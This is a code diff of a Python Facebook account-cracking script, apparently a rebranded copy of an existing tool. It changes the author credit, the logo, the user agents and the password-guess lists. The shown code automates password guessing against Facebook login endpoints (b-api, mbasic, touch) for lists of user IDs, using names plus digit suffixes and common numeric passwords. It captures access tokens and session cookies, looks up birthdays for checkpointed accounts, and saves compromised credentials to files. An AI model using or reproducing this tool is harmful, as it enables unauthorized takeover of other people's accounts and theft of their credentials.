@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-# author by Wahid Baloch
+# author by Mark Cornel
 import os
 try:
 	import requests
@@ -47,11 +47,12 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 def logo():
 	os.system("clear")
 	print("""\033[1;92m░██╗░░░░░░░██╗░█████╗░██╗░░██╗██╗██████╗░
-\033[1;93m░██║░░██╗░░██║██╔══██╗██║░░██║██║██╔══██╗
-\033[1;94m░╚██╗████╗██╔╝███████║███████║██║██║░░██║
-\033[1;95m░░████╔═████║░██╔══██║██╔══██║██║██║░░██║
-\033[1;96m░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║██║██████╔╝
-\033[1;91m░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░""")
+\033[1;92m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;92m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;97m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;97m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;92m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;92m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝░""")
  
 def login():
 	os.system("clear")
@@ -258,7 +259,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;91m[CP] %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+			print("\r\033[0;92m[GUPTA-CP] %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -271,7 +272,7 @@ def bapi(user):
 	try:
 		ua = open(".ua", "r").read()
 	except IOError:
-		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		ua = ("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
 	global loop, token
 	sys.stdout.write(
 		"\r\033[0;91m[\033[0;97mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
@@ -280,11 +281,11 @@ def bapi(user):
 	if len(name)>=6:
 		pwx = [ name, name+"123", name+"1234", name+"12345", name+"786" ]
 	elif len(name)<=2:
-		pwx = [ name+"123", name+"1234", name+"12345", "pakistan" ]
+		pwx = [ name+"123", name+"1234", name+"12345", "223344" ]
 	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345", name+"786" ]
+		pwx = [ name+"123", name+"12345", name+"123" ]
 	else:
-		pwx = [ name+"123", name+"12345", "786786" ]
+		pwx = [ name+"123", name+"12345", "334455" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -292,13 +293,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[0;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[0;91m[CP] %s|%s\033[0;97m        "%(uid, pw))
+				print("\r\033[0;91m[GUPTA-CP] %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -319,13 +320,13 @@ def mbasic(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345", name+"786" ]
+		pwx = [ name, name+"123", name+"1234", name+"12345", name+"123456" ]
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345", 223344 ]
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345", name ]
 	else:
-		pwx = [ name+"123", name+"12345", "786786" ]
+		pwx = [ name+"123", name+"12345", "445566" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
@@ -344,13 +345,13 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;91m[CP] %s|%s\033[0;91m        "%(uid, pw))
+				print("\r\033[0;91m[GUPTA-CP] %s|%s\033[0;91m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -364,20 +365,20 @@ def mobile(user):
 	try:
 		ua = open(".ua", "r").read()
 	except IOError:
-		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		ua = ("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
 	global loop, token
 	sys.stdout.write(
 		"\r\033[0;91m[\033[0;97mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345", name+"786" ]
+		pwx = [ name, name+"123", name+"1234", name+"12345", name+"123" ]
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345", 223344 ]
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345", name ]
 	else:
-		pwx = [ name+"123", name+"12345", "786786" ]
+		pwx = [ name+"123", name+"12345", "234567" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
@@ -396,13 +397,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[OK] %s|%s|%s\033[0;92m"%(uid, pw, kuki))
+				print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;92m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;91m[CP] %s|%s\033[0;91m        "%(uid, pw))
+				print("\r\033[0;91m[GUPTA-CP] %s|%s\033[0;91m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -416,9 +417,9 @@ def manual():
 	try:
 		ua = open(".ua", "r").read()
 	except IOError:
-		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		ua = ("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
 	global loop, token
-	print("\n[+] Type , For 2nd Password For Example : 223344,786786,00707 etc")
+	print("\n[+] Type , For 2nd Password For Example : 223344,445566,334455,234567,778899 etc")
 	asu = raw_input("[+] Enter Passwords : ").split(",")
 	if len(asu) =="":
 		exit("[?] Wrong Input")
@@ -446,13 +447,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[0;92m[OK] %s|%s|%s\033[0;91m"%(uid, pw, kuki))
+					print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;91m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
 					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[0;91m[CP] %s|%s\033[0;91m        "%(uid, pw))
+					print("\r\033[0;91m[GUPTA-CP] %s|%s\033[0;91m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
@@ -478,7 +479,7 @@ def setting_ua():
 		raw_input("\n [!] Press Enter To Save User-Agent")
 		menu()
 	elif ua == "2":
-		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		print("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
 		os.system("rm -f .ua")
 		time.sleep(1)
 		raw_input("\n[•] User-Agent Save Successfully")
